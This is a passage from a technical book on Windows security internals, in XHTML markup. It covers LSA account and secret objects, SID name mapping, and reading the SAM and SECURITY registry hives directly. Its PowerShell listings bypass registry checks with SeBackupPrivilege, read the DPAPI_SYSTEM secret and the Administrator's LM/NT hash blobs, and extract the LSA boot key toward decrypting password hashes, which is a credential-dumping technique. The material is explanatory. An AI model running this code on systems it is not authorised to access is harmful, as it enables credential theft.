<p class="TNI1">An <i>account object</i> is not the same as the user objects we accessed via the SAM remote service. An account object doesn’t need to be tied to a registered <span aria-label=" Page 320. " epub:type="pagebreak" id="pg_320" role="doc-pagebreak"></span>user account; instead, it’s used to configure the account rights we discussed earlier. For example, if you want to assign a specific privilege to a user account, you must ensure that an account object exists for the user’s SID and then add the privilege to that object.</p>
<p class="TX">You can create a new account object using the <samp class="SANS_TheSansMonoCd_W5Regular_11">LsaCreateAccount</samp> API if you have <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateAccount</samp> access on the policy object. However, you don’t normally need to do this directly. Instead, you’ll typically access account objects from the LSA policy, as shown in <a href="chapter10.xhtml#Lis10-15">Listing 10-15</a>.</p>
<span id="Lis10-15"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$policy = Get-LsaPolicy -Access ViewLocalInformation</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>Get-LsaAccount -Policy $policy -InfoOnly</b>
Name                                Sid
----                                ---
Window Manager\Window Manager Group S-1-5-90-0
NT VIRTUAL MACHINE\Virtual Machines S-1-5-83-0
NT SERVICE\ALL SERVICES             S-1-5-80-0
NT AUTHORITY\SERVICE                S-1-5-6
BUILTIN\Performance Log Users       S-1-5-32-559
<var>--snip--</var>

PS&gt; <b>$sid = Get-NtSid -KnownSid BuiltinUsers</b>
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> PS&gt; <b>$account = Get-LsaAccount -Policy $policy -Sid $sid</b>
PS&gt; <b>Format-NtSecurityDescriptor -Object $account -Summary</b>
&lt;Owner&gt; : BUILTIN\Administrators
&lt;Group&gt; : NT AUTHORITY\SYSTEM
&lt;DACL&gt;
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> BUILTIN\Administrators: (Allowed)(None)(Full Access)
Everyone: (Allowed)(None)(ReadControl)
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-15: Listing and opening LSA account objects</span></p>
<p class="TX">We first open the policy with the <samp class="SANS_TheSansMonoCd_W5Regular_11">ViewLocalInformation</samp> access right <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>, then use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LsaAccount</samp> PowerShell command to enumerate the account objects <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. You can see that the output lists the internal groups, not the local users we inspected earlier in the chapter, returning the name and SID for each.</p>
<p class="TX">You can then open an account object by its SID; for example, here we open the built-in user’s account object <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. The account objects are securable and have an associated security descriptor that you can query. In this case, we can see in the formatted output that only the <i>Administrators</i> group gets full access to an account <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. The only other ACE grants <samp class="SANS_TheSansMonoCd_W5Regular_11">ReadControl</samp> access to <i>Everyone</i>, which prevents the rights for an account from being enumerated. If the security descriptor allows it, account objects can be assigned the following access rights:</p>
<p class="RunInPara1"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">View  </samp>Enables viewing information about the account object, such as privileges and logon rights</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AdjustPrivileges  </samp>Enables adjusting the assigned privileges</p>
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AdjustQuotas  </samp>Enables adjusting user quotas</p>
<p class="RunInPara2"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">AdjustSystemAccess  </samp>Enables adjusting the assigned logon rights</p>
<p class="TX"><span aria-label=" Page 321. " epub:type="pagebreak" id="pg_321" role="doc-pagebreak"></span>If we rerun the commands in <a href="chapter10.xhtml#Lis10-15">Listing 10-15</a> as an administrator, we can then use the account object to enumerate privileges and logon rights, as in <a href="chapter10.xhtml#Lis10-16">Listing 10-16</a>.</p>
<span id="Lis10-16"></span><pre><code>PS&gt; <b>$account.Privileges</b>
Name                          Luid              Enabled
----                          ----              -------
SeChangeNotifyPrivilege       00000000-00000017 False
SeIncreaseWorkingSetPrivilege 00000000-00000021 False
SeShutdownPrivilege           00000000-00000013 False
SeUndockPrivilege             00000000-00000019 False
SeTimeZonePrivilege           00000000-00000022 False

PS&gt; <b>$account.SystemAccess</b>
InteractiveLogon, NetworkLogon
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-16: Enumerating privileges and logon rights</span></p>
<p class="TX">What is interesting here is that privileges and logon rights are listed in separate ways, even though you saw earlier that account rights were represented in a manner similar to privileges: using the name to identify the right to assign. For the account object, privileges are stored as a list of LUIDs, which is the same format used by the <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object. However, the logon rights are stored as a set of bit flags in the <samp class="SANS_TheSansMonoCd_W5Regular_11">SystemAccess</samp> property.</p>
<p class="TX">This difference is due to the way Microsoft designed the account right APIs that are used by <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtAccountRight</samp> and related commands. These APIs merge the various account rights and privileges into one to make it easier for a developer to write correct code. I’d recommend using <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtAccountRight</samp> or the underlying API rather than going directly to the LSA policy to inspect and modify the account rights.</p>
</section>
<section aria-labelledby="sec18" epub:type="division">
<h5 class="H3" id="sec18"><span id="h3-24"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Secret Objects</samp></h5>
<p class="TNI1">The LSA can maintain secret data for other services on the system, as well as for itself. It exposes this data through <i>secret objects</i>. To create a new secret object you need to have the <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateSecret</samp> access right on the policy<span class="Annotation-Reference">.</span> <a href="chapter10.xhtml#Lis10-17">Listing 10-17</a> shows how to open and inspect an existing LSA secret object. Run these commands as an administrator.</p>
<span id="Lis10-17"></span><pre><code>PS&gt; <b>$policy = Get-LsaPolicy</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$secret = Get-LsaSecret -Policy $policy -Name "DPAPI_SYSTEM"</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>Format-NtSecurityDescriptor $secret -Summary</b>
&lt;Owner&gt; : BUILTIN\Administrators
&lt;Group&gt; : NT AUTHORITY\SYSTEM
&lt;DACL&gt;
BUILTIN\Administrators: (Allowed)(None)(Full Access)
Everyone: (Allowed)(None)(ReadControl)

<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> PS&gt; <b>$value = $secret.Query()</b>
PS&gt;<b> $value</b>
CurrentValue    CurrentValueSetTime  OldValue        OldValueSetTime
------------    -------------------  --------        ---------------
{1, 0, 0, 0...} 3/12/2021 1:46:08 PM {1, 0, 0, 0...} 11/18 11:42:47 PM

<span aria-label=" Page 322. " epub:type="pagebreak" id="pg_322" role="doc-pagebreak"></span><span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> PS&gt; <b>$value.CurrentValue | Out-HexDump -ShowAll</b>
          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 01 00 00 00 3B 14 CB FB B0 83 3D DF 98 A5 42 F9  - ....;.....=...B.
00000010: 65 64 4B B5 95 63 E1 E8 9C C8 00 C0 80 0C 71 E0  - edK..c........q.
00000020: C3 46 B1 43 A4 96 0E 65 5E B1 EC 46              - .F.C...e^..F
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-17: Opening and inspecting an LSA secret</span></p>
<p class="TX">We start by opening the policy, then use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LsaSecret</samp> command to open a secret by name <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. There is no API to enumerate the stored secrets; you must know their names to open them. In this case, we open a secret that should exist on every system: the <i>Data Protection API (DPAPI)</i> master key, named <i>DPAPI_SYSTEM</i>. The DPAPI is used to encrypt data based on the user’s password. For it to function, it needs a system master key.</p>
<p class="TX">As the secret is securable, we can check its security descriptor <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, which can assign the following access rights:</p>
<p class="RunInPara1"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">SetValue  </samp>Enables setting the value of the secret</p>
<p class="RunInPara2"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">QueryValue  </samp>Enables querying the value of the secret</p>
<p class="TX">If you have the <samp class="SANS_TheSansMonoCd_W5Regular_11">QueryValue</samp> access right, you can inspect the contents of the key using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Query</samp> method, as we do in <a href="chapter10.xhtml#Lis10-17">Listing 10-17</a> <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. The secret contains the current value and a previous value, as well as timestamps for when those values were set. Here, we display the current value as hex <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. The contents of the secret’s value are defined by the DPAPI, which we won’t dig into further in this book.</p>
</section>
<section aria-labelledby="sec19" epub:type="division">
<h5 class="H3" id="sec19"><span id="h3-25"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Trusted Domain Objects</samp></h5>
<p class="TNI1">The final type of object in the SECURITY database is the <i>trusted domain object</i>. These objects describe the trust relationships between domains in a forest. Although the domain policy remote service was designed for use with domains prior to the introduction of Active Directory, it can still be used to query the trust relationships on a modern domain controller.</p>
<p class="TX"><a href="chapter10.xhtml#Lis10-18">Listing 10-18</a> shows an example of how to open the policy on a domain controller and then query for the list of trusted domains.</p>
<span id="Lis10-18"></span><pre><code>PS&gt; <b>$policy = Get-LsaPolicy -ServerName "PRIMARYDC"</b>
PS&gt; <b>Get-LsaTrustedDomain -Policy $policy -InfoOnly</b>
Name                      TrustDirection TrustType
----                      -------------- ---------
engineering.mineral.local BiDirectional  Uplevel
sales.mineral.local       BiDirectional  Uplevel
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-18: Enumerating trust relationships for a domain controller</span></p>
<p class="TX">To inspect and configure trust relationships, you should use Active Directory commands, not the domain policy remote service’s commands. Therefore, I won’t dwell on these objects any further; we’ll come back to the subject of inspecting trust relationships in the next chapter.</p>
<blockquote>
<span aria-label=" Page 323. " epub:type="pagebreak" id="pg_323" role="doc-pagebreak"></span>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>While trusted domains are securable objects, the security descriptors are not configurable through any of the remote service APIs; attempting this will generate an error. This is because the security is implemented by Active Directory, not the LSA.</i></p>
</blockquote>
</section>
<section aria-labelledby="sec20" epub:type="division">
<h5 class="H3" id="sec20"><span id="h3-26"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Name Lookup and Mapping</samp></h5>
<p class="TNI1">If you’re granted <samp class="SANS_TheSansMonoCd_W5Regular_11">LookupNames</samp> access, the domain policy remote service will let you translate SIDs to names, and vice versa. For example, as shown in <a href="chapter10.xhtml#Lis10-19">Listing 10-19</a>, you can specify one or more SIDs to receive the corresponding users and domains using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LsaName</samp> PowerShell command. You can also specify a name and receive the SID using <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LsaSid</samp>.</p>
<span id="Lis10-19"></span><pre><code>PS&gt; <b>$policy = Get-LsaPolicy -Access LookupNames</b>
PS&gt; <b>Get-LsaName -Policy $policy -Sid "S-1-1-0", "S-1-5-32-544"</b>
Domain  Name           Source  NameUse
------  ----           ------  -------
        Everyone       Account WellKnownGroup
BUILTIN Administrators Account Alias

PS&gt; <b>Get-LsaSid -Policy $policy -Name "Guest" | Select-Object Sddl</b>
Sddl
----
S-1-5-21-1653919079-861867932-2690720175-501
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-19: Looking up a SID or a name from the policy</span></p>
<p class="TX">Before Windows 10, it was possible for an unauthenticated user to use the lookup APIs to enumerate users on a system, as the anonymous user was granted <samp class="SANS_TheSansMonoCd_W5Regular_11">LookupNames</samp> access. This was a problem because an attack calling <i>RID cycling</i> could brute-force valid users on the system. As you witnessed in <a href="chapter10.xhtml#Lis10-14">Listing 10-14</a>, current versions of Windows explicitly deny the <samp class="SANS_TheSansMonoCd_W5Regular_11">LookupNames</samp> access right. However, RID cycling remains a useful technique for authenticated non-administrator domain users, as non-administrators can’t use the SAM remote service.</p>
<p class="TX">It’s also possible to add mappings from SIDs to names, even if they’re not well-known SIDs or registered accounts in the SAM database. The Win32 API <samp class="SANS_TheSansMonoCd_W5Regular_11">LsaManageSidNameMapping</samp> controls this. It’s used by the SCM (discussed in <span class="Xref"><a href="chapter3.xhtml">Chapter 3</a></span>) to set up service-specific SIDs to control resource access, and you can use it yourself, although you’ll encounter the following restrictions:</p>
<ul class="ul">
<li class="ListBullet">The caller needs <samp class="SANS_TheSansMonoCd_W5Regular_11">SeTcbPrivilege</samp> enabled and must be on the same system as the LSA.</li>
<li class="ListBullet">The SID to map must be in the NT security authority.</li>
<li class="ListBullet">The first RID of the SID must be between <samp class="SANS_TheSansMonoCd_W5Regular_11">80</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">111</samp> (inclusive of those values).</li>
<li class="ListBullet">You must first register a domain SID before you can add a child SID in that domain.</li>
</ul>
<p class="TX"><span aria-label=" Page 324. " epub:type="pagebreak" id="pg_324" role="doc-pagebreak"></span>You can call the <samp class="SANS_TheSansMonoCd_W5Regular_11">LsaManageSidNameMapping</samp> API to add or remove mappings using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Add-NtSidName</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Remove-NtSidName</samp> PowerShell commands. <a href="chapter10.xhtml#Lis10-20">Listing 10-20</a> shows how to add SID-to-name mappings to the LSA as an administrator.</p>
<span id="Lis10-20"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$domain_sid = Get-NtSid -SecurityAuthority Nt -RelativeIdentifier 99</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>$user_sid = Get-NtSid -BaseSid $domain_sid -RelativeIdentifier 1000</b>
PS&gt; <b>$domain = "CUSTOMDOMAIN"</b>
PS&gt; <b>$user = "USER"</b>
PS&gt; <b>Invoke-NtToken -System {</b>
<b>  </b><span aria-label="annotation3" class="CodeAnnotationCode2">❸</span><b> Add-NtSidName -Domain $domain -Sid $domain_sid -Register</b>
    <b>Add-NtSidName -Domain $domain -Name $user -Sid $user_sid -Register</b>
<b>  </b><span aria-label="annotation4" class="CodeAnnotationCode2">❹</span><b> Use-NtObject($policy = Get-LsaPolicy) {</b>
<b>        Get-LsaName -Policy $policy -Sid $domain_sid, $user_sid</b>
<b>    }</b>
<b>  </b><span aria-label="annotation5" class="CodeAnnotationCode2">❺</span><b> Remove-NtSidname -Sid $user_sid -Unregister</b>
<b>    Remove-NtSidName -Sid $domain_sid -Unregister</b>
<b>}</b>
Domain       Name      Source  NameUse
------       ----      ------  -------
CUSTOMDOMAIN           Account Domain
CUSTOMDOMAIN USER      Account WellKnownGroup
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-20: Adding and removing SID-to-name mappings</span></p>
<p class="TX">We first define the domain SID with a RID of <samp class="SANS_TheSansMonoCd_W5Regular_11">99</samp> <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>, then create a user SID based on the domain SID with a RID of <samp class="SANS_TheSansMonoCd_W5Regular_11">1000</samp> <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. We’re impersonating the <i>SYSTEM</i> user, so we have the <samp class="SANS_TheSansMonoCd_W5Regular_11">SeTcbPrivilege</samp> privilege, which means we can use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Add-NtSidName</samp> command with the <samp class="SANS_TheSansMonoCd_W5Regular_11">Register</samp> parameter to add the mapping <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. (Recall that you need to register the domain before adding the user.) We then use the policy to check the SID mappings for the LSA <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. Finally, we remove the SID-to-name mappings to clean up the changes we’ve made <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>.</p>
<p class="TX">This concludes our discussion of the LSA policy. Let’s now look at how the two configuration databases, SAM and SECURITY, are stored locally.</p>
</section>
</section>
</section>
<section aria-labelledby="sec21" epub:type="division">
<h3 class="H1" id="sec21"><span id="h1-78"></span><samp class="SANS_Futura_Std_Bold_B_11">The SAM and SECURITY Databases</samp></h3>
<p class="TNI1">You’ve seen how to access the SAM and SECURITY databases using the remote services. However, you’ll find it instructive to explore how these databases are stored locally, as registry keys. By accessing the databases directly, you can obtain information not exposed by the remote services, such as password hashes.</p>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">WARNING</samp></span></p>
<p class="NOTE-TXT"><i>These registry keys aren’t designed to be accessed directly, so the way in which they store the user and policy configurations could change at any time. Keep in mind that the description provided in this section might no longer be accurate at the time you’re reading it. Also, because direct access is a common technique used by malicious software, it’s very possible that script code in this section that you attempt to run may be blocked by any antivirus product running on your system.</i></p>
<section aria-labelledby="sec22" epub:type="division">
<h4 class="H2" id="sec22"><span id="h2-100"></span><span aria-label=" Page 325. " epub:type="pagebreak" id="pg_325" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Accessing the SAM Database Through the Registry</samp></h4>
<p class="TNI1">Let’s start with the SAM database, found in the registry at <i>REGISTRY\MACHINE\SAM.</i> It’s secured so that only the <i>SYSTEM</i> user can read and write to its registry keys. You could run PowerShell as the <i>SYSTEM</i> user with the <samp class="SANS_TheSansMonoCd_W5Regular_11">Start-Win32ChildProcess</samp> command and then access the registry that way, but there is a simpler approach.</p>
<p class="TX">As an administrator, we can bypass the read access check on the registry by enabling <samp class="SANS_TheSansMonoCd_W5Regular_11">SeBackupPrivilege</samp>. If we create a new object manager drive provider while this privilege is enabled, we can inspect the SAM database registry key using the shell. Run the commands in <a href="chapter10.xhtml#Lis10-21">Listing 10-21</a> as an administrator.</p>
<span id="Lis10-21"></span><pre><code>PS&gt; <b>Enable-NtTokenPrivilege SeBackupPrivilege</b>
PS&gt; <b>New-PSDrive -PSProvider NtObjectManager -Name SEC -Root ntkey:MACHINE</b>
PS&gt; <b>ls -Depth 1 -Recurse SEC:\SAM\SAM</b>
Name                    TypeName
----                    --------
SAM\SAM\Domains         Key
SAM\SAM\LastSkuUpgrade  Key
SAM\SAM\RXACT           Key
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> SAM\SAM\Domains\Account Key
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> SAM\SAM\Domains\Builtin Key
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-21: Mapping the</span> <samp class="SANS_Futura_Std_Book_11">MACHINE</samp> <span class="Futura_Std_Book_Oblique_I_11">registry key with SeBackupPrivilege and listing the SAM database registry key</span></p>
<p class="TX">We begin by enabling <samp class="SANS_TheSansMonoCd_W5Regular_11">SeBackupPrivilege</samp>. With the privilege enabled, we can use the <samp class="SANS_TheSansMonoCd_W5Regular_11">New-PSDrive</samp> command to map a view of the <i>MACHINE</i> registry key to the <i>SEC:</i> drive. This enables the drive to use <samp class="SANS_TheSansMonoCd_W5Regular_11">SeBackupPrivilege</samp> to circumvent security checking.</p>
<p class="TX">We can list the contents of the SAM database registry key using the normal PowerShell commands. The two most important keys are <i>Account</i> <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> and <i>Builtin</i> <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. The <i>Account</i> key represents the local domain we accessed using the SAM remote service and contains the details of local users and groups. The <i>Builtin</i> key contains the local built-in groups; for example, <i>BUILTIN\Administrators</i>.</p>
<section aria-labelledby="sec23" epub:type="division">
<h5 class="H3" id="sec23"><span id="h3-27"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Extracting User Configurations</samp></h5>
<p class="TNI1">Let’s use our access to the SAM database registry key to extract the configuration of a user account. <a href="chapter10.xhtml#Lis10-22">Listing 10-22</a> shows how to inspect a user’s configuration. Run these commands as an administrator.</p>
<span id="Lis10-22"></span><pre><code>PS&gt; <b>$key = Get-Item SEC:\SAM\SAM\Domains\Account\Users\000001F4 </b><span aria-label="annotation1" class="CodeAnnotationCode">❶</span>
PS&gt; <b>$key.Values </b><span aria-label="annotation2" class="CodeAnnotationCode">❷</span>
Name                    Type   DataObject
----                    ----   ----------
F                       Binary {3, 0, 1, 0...}
V                       Binary {0, 0, 0, 0...}
SupplementalCredentials Binary {0, 0, 0, 0...}

<span aria-label=" Page 326. " epub:type="pagebreak" id="pg_326" role="doc-pagebreak"></span>PS&gt; <b>function Get-VariableAttribute($key, [int]$Index) {</b>
<b>    $MaxAttr = 0x11</b>
<b>    $V = $key["V"].Data</b>
<b>    $base_ofs = $Index * 12</b>
<b>    $curr_ofs = [System.BitConverter]::ToInt32($V, $base_ofs) + ($MaxAttr * 12)</b>
<b>    $len = [System.BitConverter]::ToInt32($V, $base_ofs + 4)</b>

<b>    if ($len -gt 0) {</b>
<b>       $V[$curr_ofs..($curr_ofs+$len-1)]</b>
<b>    } else {</b>
<b>        @()</b>
<b>    }</b>
<b>}</b>

PS&gt; <b>$sd = Get-VariableAttribute $key -Index 0 </b><span aria-label="annotation3" class="CodeAnnotationCode">❸</span>
PS&gt; <b>New-NtSecurityDescriptor -Byte $sd</b>
Owner<b>                  </b>DACL ACE Count SACL ACE Count Integrity Level
-----<b>                  </b>-------------- -------------- ---------------
BUILTIN\Administrators 4<b>              </b>2<b>              </b>NONE

PS&gt; <b>Get-VariableAttribute $key -Index 1 | Out-HexDump -ShowAll </b><span aria-label="annotation4" class="CodeAnnotationCode">❹</span>
                   00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 41 00 64 00 6D 00 69 00 6E 00 69 00 73 00 74 00  - A.d.m.i.n.i.s.t.
00000010: 72 00 61 00 74 00 6F 00 72 00                    - r.a.t.o.r.

PS&gt; <b>$lm = Get-VariableAttribute $key -Index 13 </b><span aria-label="annotation5" class="CodeAnnotationCode">❺</span>
PS&gt;<b> $lm | Out-HexDump -ShowAddress</b>
00000000: 03 00 02 00 00 00 00 00 4B 70 1B 49 1A A4 F9 36
00000010: 81 F7 4D 52 8A 1B A5 D0

PS&gt; <b>$nt = Get-VariableAttribute $key -Index 14 </b><span aria-label="annotation6" class="CodeAnnotationCode">❻</span>
PS&gt; <b>$nt | Out-HexDump -ShowAddress</b>
00000000: 03 00 02 00 10 00 00 00 CA 15 AB DA 31 00 2A 72
00000010: 6E 4B CE 89 27 7E A6 F6 D8 19 CE B7 58 AC 93 F5
00000020: D1 89 73 FB B2 C3 AA 41 95 FE 6F F8 B7 58 37 09
00000030: 0D 4B E2 4C DB 37 3F 91
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-22: Displaying data for the default administrator user</span></p>
<p class="TX">The registry key stores user information in keys where the name is the hexadecimal representation of the user’s RID in the domain. For example, in <a href="chapter10.xhtml#Lis10-22">Listing 10-22</a>, we query for the <i>Administrator</i> user, which always has a RID of <samp class="SANS_TheSansMonoCd_W5Regular_11">500</samp> in decimal. Therefore, we know it will be stored in the key <samp class="SANS_TheSansMonoCd_W5Regular_11">000001F4</samp>, which is the RID in hexadecimal <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. You could also list the <i>Users</i> key to find other users.</p>
<p class="TX">The key contains a small number of binary values <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. In this example, we have three values: the <samp class="SANS_TheSansMonoCd_W5Regular_11">F</samp> value, which is a set of fixed-sized attributes for the user; <samp class="SANS_TheSansMonoCd_W5Regular_11">V</samp>, which is a set of variable-sized attributes; and <samp class="SANS_TheSansMonoCd_W5Regular_11">SupplementalCredentials</samp>, which could be used to store credentials other than the NT hash, such as online accounts or biometric information.</p>
<p class="TX"><span aria-label=" Page 327. " epub:type="pagebreak" id="pg_327" role="doc-pagebreak"></span>At the start of the variable-sized attributes value is an attribute index table. Each index entry has an offset, a size, and additional flags. The important user data is stored in these indexes:</p>
<p class="RunInPara1"><b>Index 0    </b>The user object’s security descriptor <span aria-label="annotation3" class="CodeAnnotationCode">❸</span></p>
<p class="RunInPara"><b>Index 1    </b>The user’s name <span aria-label="annotation4" class="CodeAnnotationCode">❹</span></p>
<p class="RunInPara"><b>Index 13    </b>The user’s LM hash <span aria-label="annotation5" class="CodeAnnotationCode">❺</span></p>
<p class="RunInPara2"><b>Index 14    </b>The user’s NT hash <span aria-label="annotation6" class="CodeAnnotationCode">❻</span></p>
<p class="TX">The LM and NT hash values aren’t stored in plaintext; the LSA obfuscates them using a couple of different encryption algorithms, such as RC4 and Advanced Encryption Standard (AES). Let’s develop some code to extract the hash values for a user.</p>
</section>
<section aria-labelledby="sec24" epub:type="division">
<h5 class="H3" id="sec24"><span id="h3-28"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Extracting the System Key</samp></h5>
<p class="TNI1">In the original version of Windows NT, you needed only the SAM database registry key to decrypt the NT hash. In Windows 2000 and later, you need an additional key, the <i>LSA system key</i>, which is hidden inside the <i>SYSTEM</i> registry key. This key is also used as part of the obfuscation mechanism for values in the SECURITY database registry key.</p>
<p class="TX">The first step to extracting an NT hash is extracting the system key into a form we can use. <a href="chapter10.xhtml#Lis10-23">Listing 10-23</a> shows an example.</p>
<span id="Lis10-23"></span><pre><code>PS&gt; <b>function Get-LsaSystemKey {</b>
<b>  </b><span aria-label="annotation1" class="CodeAnnotationCode2">❶</span><b> $names = "JD", "Skew1", "GBG", "Data"</b>
<b>    $keybase = "NtKey:\MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\"</b>
<b>    $key = $names | ForEach-Object {</b>
<b>        $key = Get-Item "$keybase\$_"</b>
<b>     </b><span aria-label="annotation2" class="CodeAnnotationCode">❷</span><b> $key.ClassName | ConvertFrom-HexDump</b>
<b>    }</b>
<b>  </b><span aria-label="annotation3" class="CodeAnnotationCode2">❸</span><b> 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 |</b>
<b>ForEach-Object {</b>
<b>        $key[$_]</b>
<b>    }</b>
<b>}</b>
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> PS&gt; <b>Get-LsaSystemKey | Out-HexDump</b>
3E 98 06 D8 E3 C7 12 88 99 CF F4 1D 5E DE 7E 21
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-23: Extracting the obfuscated LSA system key</span></p>
<p class="TX">The key is stored in four separate parts inside the LSA configuration key <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. To add a layer of obfuscation, the parts aren’t stored as registry values; instead, they’re hexadecimal text strings stored in the rarely used registry key class name value. We can extract these values using the <samp class="SANS_TheSansMonoCd_W5Regular_11">ClassName</samp> property and then convert them to bytes <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
<p class="TX">We must then permutate the boot key’s byte values using a fixed ordering to generate the final key <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. We can run the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LsaSystemKey</samp> PowerShell command to display the bytes <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. Note that the value of the key is system specific, so the output you see will almost certainly be different.</p>
<p class="TX"><span aria-label=" Page 328. " epub:type="pagebreak" id="pg_328" role="doc-pagebreak"></span>One interesting thing to note is that getting the boot key doesn’t require administrator access. This means that an arbitrary file-read vulnerability could enable a non-administrator to extract the registry hive files backing the <i>SAM</i> and <i>SECURITY</i> registry keys and decrypt their contents (which doesn’t seem like a particularly good application of defense in depth).</p>
</section>
<section aria-labelledby="sec25" epub:type="division">
<h5 class="H3" id="sec25"><span id="h3-29"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Decrypting the Password Encryption Key</samp></h5>
<p class="TNI1">The next step in the deobfuscation process is to decrypt the <i>password encryption key (PEK)</i> using the system key. The PEK is used to encrypt the user hash values we extracted in <a href="chapter10.xhtml#Lis10-22">Listing 10-22</a>. In <a href="chapter10.xhtml#Lis10-24">Listing 10-24</a>, we define the function to decrypt the PEK.</p>
<span id="Lis10-24"></span><pre><code>PS&gt; <b>function Unprotect-PasswordEncryptionKey {</b>
<b>  </b><span aria-label="annotation1" class="CodeAnnotationCode2">❶</span><b> $key = Get-Item SEC:\SAM\SAM\Domains\Account</b>
<b>    $fval = $key["F"].Data</b>

<b>  </b><span aria-label="annotation2" class="CodeAnnotationCode2">❷</span><b> $enctype = [BitConverter]::ToInt32($fval, 0x68)</b>
<b>    $endofs = [BitConverter]::ToInt32($fval, 0x6C) + 0x68</b>
<b>    $data = $fval[0x70..($endofs-1)]</b>
<b>  </b><span aria-label="annotation3" class="CodeAnnotationCode2">❸</span><b> switch($enctype) {</b>
<b>        1 {Unprotect-PasswordEncryptionKeyRC4 -Data $data}</b>
<b>        2 {Unprotect-PasswordEncryptionKeyAES -Data $data}</b>
<b>        default {throw "Unknown password encryption format"}</b>
<b>    }</b>
<b>}</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-24: Defining the Unprotect-PasswordEncryptionKey decryption function</span></p>
